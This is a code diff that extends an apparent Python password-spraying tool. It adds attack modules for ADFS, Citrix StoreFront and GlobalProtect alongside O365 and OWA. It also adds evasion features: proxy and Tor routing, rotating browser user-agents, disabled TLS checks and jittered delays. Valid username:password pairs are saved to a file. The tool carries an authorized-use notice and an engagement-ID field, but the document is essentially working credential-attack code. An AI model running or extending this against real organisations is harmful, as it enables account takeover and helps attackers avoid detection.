@@ -8,18 +8,32 @@ Unauthorized use against systems you do not own is illegal.
 import argparse
 import json
 import random
+import signal
 import sys
 import time
-from datetime import datetime
+from datetime import datetime, timezone
 from pathlib import Path
 
 import requests
 
-from targets import o365, owa
+from targets import adfs, citrix, globalprotect, o365, owa
+
+# Built-in user-agent pool for rotation (real browsers, recent versions).
+_DEFAULT_UA_POOL = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
+]
 
 
 def _now() -> str:
     return datetime.now().strftime("%H:%M:%S")
+
+
+def _iso_now() -> str:
+    return datetime.now(timezone.utc).isoformat()
 
 
 def _load_lines(path: str) -> list[str]:
@@ -39,14 +53,16 @@ def _save_state(state_file: Path, attempted: set[str]) -> None:
     state_file.write_text(json.dumps({"attempted": list(attempted)}))
 
 
-def _log_attempt(log_file: Path, username: str, password: str, status: str, notes: str) -> None:
+def _log_attempt(log_file: Path, username: str, password: str, status: str, notes: str, extra: dict | None = None) -> None:
     entry = {
-        "timestamp": datetime.utcnow().isoformat() + "Z",
+        "timestamp": _iso_now(),
         "username": username,
         "password": password,
         "status": status,
         "notes": notes,
     }
+    if extra:
+        entry.update(extra)
     with log_file.open("a") as f:
         f.write(json.dumps(entry) + "\n")
 
@@ -56,13 +72,24 @@ def _write_valid(output_file: Path, username: str, password: str) -> None:
         f.write(f"{username}:{password}\n")
 
 
-def _attempt_generic(username: str, password: str, url: str, success_code: int) -> dict:
+def _attempt_generic(
+    username: str,
+    password: str,
+    url: str,
+    success_code: int,
+    proxies: dict | None,
+    headers: dict | None,
+    verify: bool,
+) -> dict:
     try:
         r = requests.post(
             url,
             data={"username": username, "password": password},
             allow_redirects=False,
             timeout=15,
+            proxies=proxies,
+            headers=headers,
+            verify=verify,
         )
     except Exception as e:
         return {"success": False, "locked": False, "notes": f"request error: {e}"}
@@ -84,6 +111,22 @@ def _build_pairs(userlist: list[str], passwords: list[str]) -> list[tuple[str, s
     return pairs
 
 
+def _build_proxies(arg: str | None) -> dict | None:
+    if not arg:
+        return None
+    return {"http": arg, "https": arg}
+
+
+def _build_ua_pool(arg: str | None) -> list[str]:
+    if not arg:
+        return list(_DEFAULT_UA_POOL)
+    p = Path(arg)
+    if p.exists():
+        loaded = _load_lines(str(p))
+        return loaded or list(_DEFAULT_UA_POOL)
+    return [arg]
+
+
 def main() -> None:
     parser = argparse.ArgumentParser(
         description=(
@@ -97,9 +140,15 @@ def main() -> None:
     parser.add_argument(
         "--target",
         required=True,
-        help="Target type: 'o365', 'owa', or a generic URL (https://...)",
+        help=(
+            "Target type. Built-ins: 'o365', 'owa', 'adfs', 'citrix', 'globalprotect'. "
+            "Or a generic URL (https://...)."
+        ),
     )
     parser.add_argument("--owa-url", help="Base OWA URL (required when --target owa)")
+    parser.add_argument("--adfs-url", help="Base ADFS URL (required when --target adfs)")
+    parser.add_argument("--citrix-url", help="Base Citrix StoreFront URL (required when --target citrix)")
+    parser.add_argument("--gp-url", help="Base GlobalProtect portal URL (required when --target globalprotect)")
     parser.add_argument(
         "--output", default="valid_creds.txt", help="File to write valid credentials (default: valid_creds.txt)"
     )
@@ -126,85 +175,175 @@ def main() -> None:
         action="store_true",
         help="Resume from .spray_state.json, skipping already-attempted pairs",
     )
+    parser.add_argument(
+        "--proxy",
+        help="HTTP(S) proxy URL (e.g. http://127.0.0.1:8080 or socks5h://127.0.0.1:9050). Applies to all requests.",
+    )
+    parser.add_argument(
+        "--user-agents",
+        help=(
+            "User-agent rotation source. Either a path to a file (one UA per line) or a single UA string. "
+            "When omitted, a built-in pool of recent browser UAs is used."
+        ),
+    )
+    parser.add_argument(
+        "--insecure",
+        action="store_true",
+        help="Disable TLS certificate verification (use only against trusted lab targets).",
+    )
+    parser.add_argument(
+        "--engagement-id",
+        help="Engagement identifier — recorded in every log entry for client reporting.",
+    )
+    parser.add_argument(
+        "--max-attempts",
+        type=int,
+        default=0,
+        help="Hard cap on total attempts in this run (0 = unlimited). Useful for time-boxed engagements.",
+    )
     args = parser.parse_args()
 
     if not args.password and not args.passlist:
         parser.error("One of --password or --passlist is required.")
 
-    if args.target == "owa" and not args.owa_url:
-        parser.error("--owa-url is required when --target is 'owa'.")
+    target_requirements = {
+        "owa": ("--owa-url", args.owa_url),
+        "adfs": ("--adfs-url", args.adfs_url),
+        "citrix": ("--citrix-url", args.citrix_url),
+        "globalprotect": ("--gp-url", args.gp_url),
+    }
+    if args.target in target_requirements:
+        flag, value = target_requirements[args.target]
+        if not value:
+            parser.error(f"{flag} is required when --target is '{args.target}'.")
 
     userlist = _load_lines(args.userlist)
-    passwords = [args.password] if args.password else _load_lines(args.passlist)
+    if args.passlist:
+        passwords = _load_lines(args.passlist)
+    else:
+        passwords = [args.password]
 
     output_file = Path(args.output)
     log_file = output_file.parent / ".spray_log.jsonl"
     state_file = output_file.parent / ".spray_state.json"
 
     attempted: set[str] = _load_state(state_file) if args.resume else set()
+    proxies = _build_proxies(args.proxy)
+    ua_pool = _build_ua_pool(args.user_agents)
+    verify_tls = not args.insecure
+    log_extra = {"engagement_id": args.engagement_id} if args.engagement_id else None
 
     pairs = _build_pairs(userlist, passwords)
     lockout_counts: dict[str, int] = {}
 
     valid_count = 0
     skipped = 0
-
-    print(f"[{_now()}] Starting spray: {len(userlist)} users x {len(passwords)} passwords = {len(pairs)} pairs", file=sys.stderr)
-    if args.resume and attempted:
-        print(f"[{_now()}] Resuming: {len(attempted)} pairs already attempted", file=sys.stderr)
-
-    for username, password in pairs:
-        pair_key = f"{username}:{password}"
-
-        if pair_key in attempted:
-            skipped += 1
-            continue
-
-        if lockout_counts.get(username, 0) >= args.lockout_threshold:
-            continue
-
-        sleep_time = args.delay + random.uniform(0, args.jitter)
-        time.sleep(sleep_time)
-
-        if args.target == "o365":
-            result = o365.attempt(username, password)
-        elif args.target == "owa":
-            result = owa.attempt(username, password, args.owa_url)
-        else:
-            result = _attempt_generic(username, password, args.target, args.success_code)
-
-        if result["notes"] == "rate_limited":
-            pause = args.delay * 5
-            print(f"[{_now()}] WARNING: rate limited — pausing {pause:.1f}s", file=sys.stderr)
-            time.sleep(pause)
-            result = {"success": False, "locked": False, "notes": "rate_limited_skipped"}
-
-        status = "VALID" if result["success"] else ("LOCKED" if result["locked"] else "INVALID")
-        print(f"[{_now()}] {username}:{password} → {status} | {result['notes']}", file=sys.stderr)
-
-        _log_attempt(log_file, username, password, status, result["notes"])
-        attempted.add(pair_key)
-        if len(attempted) % 50 == 0:
-            _save_state(state_file, attempted)
-
-        if result["success"]:
-            valid_count += 1
-            _write_valid(output_file, username, password)
-
-        if result["locked"]:
-            lockout_counts[username] = lockout_counts.get(username, 0) + 1
-            if lockout_counts[username] >= args.lockout_threshold:
-                print(f"[{_now()}] Skipping {username} — lockout threshold reached", file=sys.stderr)
-
-        locked_out_count = sum(1 for c in lockout_counts.values() if c >= args.lockout_threshold)
-        if locked_out_count == len(userlist):
-            print(f"[{_now()}] All accounts hit lockout threshold. Exiting.", file=sys.stderr)
-            break
-
-    _save_state(state_file, attempted)
+    total_attempts = 0
 
     print(
-        f"[{_now()}] Done. Valid: {valid_count} | Locked out: {len(locked_out)} | Skipped (resume): {skipped}",
+        f"[{_now()}] Starting spray: {len(userlist)} users x {len(passwords)} passwords = {len(pairs)} pairs",
+        file=sys.stderr,
+    )
+    if args.resume and attempted:
+        print(f"[{_now()}] Resuming: {len(attempted)} pairs already attempted", file=sys.stderr)
+    if proxies:
+        print(f"[{_now()}] Using proxy: {args.proxy}", file=sys.stderr)
+    if args.engagement_id:
+        print(f"[{_now()}] Engagement ID: {args.engagement_id}", file=sys.stderr)
+
+    # Ensure state is persisted on Ctrl+C or kill.
+    def _on_signal(signum, _frame):
+        _save_state(state_file, attempted)
+        print(f"\n[{_now()}] Signal {signum} — state saved, exiting.", file=sys.stderr)
+        sys.exit(130)
+
+    signal.signal(signal.SIGINT, _on_signal)
+    signal.signal(signal.SIGTERM, _on_signal)
+
+    try:
+        for username, password in pairs:
+            pair_key = f"{username}:{password}"
+
+            if pair_key in attempted:
+                skipped += 1
+                continue
+
+            if lockout_counts.get(username, 0) >= args.lockout_threshold:
+                continue
+
+            if args.max_attempts and total_attempts >= args.max_attempts:
+                print(f"[{_now()}] Max attempts ({args.max_attempts}) reached. Exiting.", file=sys.stderr)
+                break
+
+            sleep_time = args.delay + random.uniform(0, args.jitter)
+            time.sleep(sleep_time)
+
+            headers = {"User-Agent": random.choice(ua_pool)} if ua_pool else None
+
+            if args.target == "o365":
+                result = o365.attempt(username, password, proxies=proxies)
+            elif args.target == "owa":
+                result = owa.attempt(
+                    username, password, args.owa_url,
+                    proxies=proxies, headers=headers, verify=verify_tls,
+                )
+            elif args.target == "adfs":
+                result = adfs.attempt(
+                    username, password, args.adfs_url,
+                    proxies=proxies, headers=headers, verify=verify_tls,
+                )
+            elif args.target == "citrix":
+                result = citrix.attempt(
+                    username, password, args.citrix_url,
+                    proxies=proxies, headers=headers, verify=verify_tls,
+                )
+            elif args.target == "globalprotect":
+                result = globalprotect.attempt(
+                    username, password, args.gp_url,
+                    proxies=proxies, headers=headers, verify=verify_tls,
+                )
+            else:
+                result = _attempt_generic(
+                    username, password, args.target, args.success_code,
+                    proxies=proxies, headers=headers, verify=verify_tls,
+                )
+
+            total_attempts += 1
+
+            if result["notes"] == "rate_limited":
+                pause = args.delay * 5
+                print(f"[{_now()}] WARNING: rate limited — pausing {pause:.1f}s", file=sys.stderr)
+                time.sleep(pause)
+                result = {"success": False, "locked": False, "notes": "rate_limited_skipped"}
+
+            status = "VALID" if result["success"] else ("LOCKED" if result["locked"] else "INVALID")
+            print(f"[{_now()}] {username}:{password} → {status} | {result['notes']}", file=sys.stderr)
+
+            _log_attempt(log_file, username, password, status, result["notes"], extra=log_extra)
+            attempted.add(pair_key)
+            if len(attempted) % 50 == 0:
+                _save_state(state_file, attempted)
+
+            if result["success"]:
+                valid_count += 1
+                _write_valid(output_file, username, password)
+
+            if result["locked"]:
+                lockout_counts[username] = lockout_counts.get(username, 0) + 1
+                if lockout_counts[username] >= args.lockout_threshold:
+                    print(f"[{_now()}] Skipping {username} — lockout threshold reached", file=sys.stderr)
+
+            locked_out_count = sum(1 for c in lockout_counts.values() if c >= args.lockout_threshold)
+            if locked_out_count == len(userlist):
+                print(f"[{_now()}] All accounts hit lockout threshold. Exiting.", file=sys.stderr)
+                break
+
+    finally:
+        _save_state(state_file, attempted)
+
+    locked_out_total = sum(1 for c in lockout_counts.values() if c >= args.lockout_threshold)
+    print(
+        f"[{_now()}] Done. Valid: {valid_count} | Locked out: {locked_out_total} | Skipped (resume): {skipped} | Attempts: {total_attempts}",
         file=sys.stderr,
     )
     print(f"[{_now()}] Valid creds written to: {output_file}", file=sys.stderr)
